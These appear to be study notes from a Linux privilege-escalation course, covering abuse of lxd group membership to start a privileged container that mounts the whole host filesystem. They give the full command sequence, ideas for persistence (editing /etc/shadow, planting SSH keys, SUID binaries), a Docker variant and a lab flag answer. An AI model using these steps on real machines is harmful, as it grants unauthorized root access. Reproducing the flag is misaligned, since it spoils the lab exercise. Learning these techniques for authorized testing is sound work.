# Section 14 — LXD

## ID
532

## Module
Linux Privilege Escalation

## Kind
notes

## Title
Section 14 — LXD

## Description
Covers privilege escalation by abusing membership in the lxd group to create a privileged container that mounts the host filesystem, giving full root-level read/write access to the host.

## Tags
privesc, lxd, lxc, containers, group-abuse, linux

## Commands
- id
- lxc image import <IMAGE>.tar.gz --alias <ALIAS>
- lxc image list
- lxc init <ALIAS> <CONTAINER_NAME> -c security.privileged=true
- lxc config device add <CONTAINER_NAME> host-root disk source=/ path=/mnt/root recursive=true
- lxc start <CONTAINER_NAME>
- lxc exec <CONTAINER_NAME> /bin/sh

## What This Section Covers
LXD is a system container manager similar to Docker. Users in the `lxd` group can create and manage containers without root privileges. The attack abuses `security.privileged=true` to run the container as root, then mounts the host filesystem into the container — effectively giving the attacker full read/write access to the entire host disk, including `/root`, `/etc/shadow`, etc.

## Methodology
1. Confirm the current user is in the `lxd` group with `id`.
2. Locate or transfer a lightweight container image (Alpine is ideal — ~3.6 MB).
3. Import the image: `lxc image import ./alpine.tar.gz --alias alpine-container`.
4. Initialize a privileged container: `lxc init alpine-container privesc -c security.privileged=true`.
5. Mount the host root filesystem into the container: `lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true`.
6. Start the container and exec into it: `lxc start privesc && lxc exec privesc /bin/sh`.
7. Access the host filesystem at `/mnt/root` — read flags, add SSH keys, edit `/etc/shadow`, etc.

## Multi-step Workflow (optional)
```
lxc image import ./alpine-v3.18-x86_64-20230607_1234.tar.gz --alias alpine-container
lxc init alpine-container privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
cat /mnt/root/root/flag.txt
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Submit contents of flag.txt | HTB{C0nT41n3rs_uhhh} | Created privileged LXD container → mounted host /root → cat flag |

## Key Takeaways
- Membership in the `lxd` group is equivalent to root access — always check `id` output for `lxd` or `docker` groups as a first step in enumeration.
- `security.privileged=true` disables all container isolation (no user namespace mapping) — the container's root IS host root.
- You can mount `source=/` instead of just `source=/root` to get the entire host filesystem, allowing you to edit `/etc/passwd`, `/etc/shadow`, plant SSH keys, or drop a SUID binary.
- If no container image exists on the box, you can build one on your attack machine with `lxd-alpine-builder` and transfer the tarball over.
- This same pattern applies to Docker: `docker run -v /:/mnt/root -it alpine` achieves the same result if the user is in the `docker` group.

## Gotchas
- LXD must be initialized (`lxd init`) before you can use `lxc` commands — if it hasn't been initialized, run `lxd init` with default settings first.
- If you mount `source=/root` (not `source=/`), the flag path inside the container is `/mnt/root/flag.txt`. If you mount `source=/`, the flag is at `/mnt/root/root/flag.txt` — pay attention to the nesting.
- On older systems, `lxc` may not be in PATH — try `/snap/bin/lxc` if the command is not found.
